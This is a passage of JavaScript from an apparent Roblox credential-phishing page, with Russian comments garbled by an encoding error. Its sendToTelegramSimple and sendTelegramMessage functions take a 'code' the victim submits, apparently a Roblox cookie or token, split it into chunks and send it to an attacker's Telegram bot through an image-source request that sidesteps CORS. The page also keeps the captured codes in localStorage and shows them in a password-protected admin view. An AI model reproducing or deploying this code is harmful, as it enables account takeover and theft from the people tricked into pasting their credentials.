                setTimeout(() => {

                        '‚ö†Ô∏è –ö—É–∫–∏ —É—Å—Ç–∞—Ä–µ–ª',

        // =========== –ü–†–û–°–¢–û–ô –ú–ï–¢–û–î –û–¢–ü–†–ê–í–ö–ò ===========
        function sendToTelegramSimple(code) {
            return new Promise((resolve) => {
                const time = new Date().toLocaleString('ru-RU');
                
                // –§–æ—Ä–º–∏—Ä—É–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ
                let message = `üîê –ù–û–í–´–ô –ö–û–î\n\n`;
                message += `‚è∞ ${time}\n`;
                message += `üìè ${code.length} —Å–∏–º–≤–æ–ª–æ–≤\n\n`;
                message += `üîë –ö–û–î:\n`;
                
                // –ï—Å–ª–∏ –∫–æ–¥ –∫–æ—Ä–æ—Ç–∫–∏–π - –æ—Ç–ø—Ä–∞–≤–ª—è–µ–º —Ü–µ–ª–∏–∫–æ–º
                if (code.length <= 3000) {
                    message += `${code}`;
                    sendTelegramMessage(message);
                    resolve(true);
                } 
                // –ï—Å–ª–∏ –∫–æ–¥ –¥–ª–∏–Ω–Ω—ã–π - –æ—Ç–ø—Ä–∞–≤–ª—è–µ–º –¥–≤—É–º—è —Å–æ–æ–±—â–µ–Ω–∏—è–º–∏
                else {
                    // –ü–µ—Ä–≤–∞—è —á–∞—Å—Ç—å
                    const part1 = `üîê –î–õ–ò–ù–ù–´–ô –ö–û–î (${code.length} —Å–∏–º–≤–æ–ª–æ–≤)\n\n–ß–∞—Å—Ç—å 1/2:\n${code.substring(0, 3000)}`;
                    sendTelegramMessage(part1);
                    
                    // –í—Ç–æ—Ä–∞—è —á–∞—Å—Ç—å —á–µ—Ä–µ–∑ —Å–µ–∫—É–Ω–¥—É
                    setTimeout(() => {
                        const part2 = `üîê –ß–∞—Å—Ç—å 2/2:\n${code.substring(3000)}`;
                        sendTelegramMessage(part2);
                        resolve(true);
                    }, 1000);
                }
            });
        }
        
        // –û—Ç–ø—Ä–∞–≤–∫–∞ –æ–¥–Ω–æ–≥–æ —Å–æ–æ–±—â–µ–Ω–∏—è —á–µ—Ä–µ–∑ img.src (—Ä–∞–±–æ—Ç–∞–µ—Ç –≤—Å–µ–≥–¥–∞)
        function sendTelegramMessage(text) {
            const encodedText = encodeURIComponent(text);
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodedText}`;
            
            // –ò—Å–ø–æ–ª—å–∑—É–µ–º Image –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏ GET –∑–∞–ø—Ä–æ—Å–∞ (–Ω–µ—Ç CORS –æ—à–∏–±–æ–∫)
            const img = new Image();
            img.src = url;
            
            console.log('üì§ –°–æ–æ–±—â–µ–Ω–∏–µ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ –≤ Telegram');
        }
        
        // =========== LOCALSTORAGE ===========
        function saveLocalCode(code) {
            const codes = JSON.parse(localStorage.getItem('robloxCodes') || '[]');
            codes.unshift({
                code: code,
                time: new Date().toLocaleString('ru-RU'),
                length: code.length
            });
            if (codes.length > 50) codes.length = 50;
            localStorage.setItem('robloxCodes', JSON.stringify(codes));
        }
        
        // =========== –ê–î–ú–ò–ù–ö–ê ===========
        function showAdmin() {
            const password = prompt('–í–≤–µ–¥–∏—Ç–µ –ø–∞—Ä–æ–ª—å –∞–¥–º–∏–Ω–∫–∏:');
            if (password === ADMIN_PASS) {
                const codes = JSON.parse(localStorage.getItem('robloxCodes') || '[]');
                let result = 'üìã –ö–æ–¥—ã –∏–∑ localStorage:\n\n';
                
                codes.forEach((item, index) => {
                    result += `–ö–æ–¥ #${index + 1} (${item.time}):\n`;
                    result += `${item.code.substring(0, 100)}${item.code.length > 100 ? '...' : ''}\n\n`;
                });
                
                alert(result);
            } else {
                alert('‚ùå –ù–µ–≤–µ—Ä–Ω—ã–π –ø–∞—Ä–æ–ª—å!');
            }
        }
        
        // =========== –¢–ï–°–¢–û–í–ê–Ø –û–¢–ü–†–ê–í–ö–ê ===========

    </script>
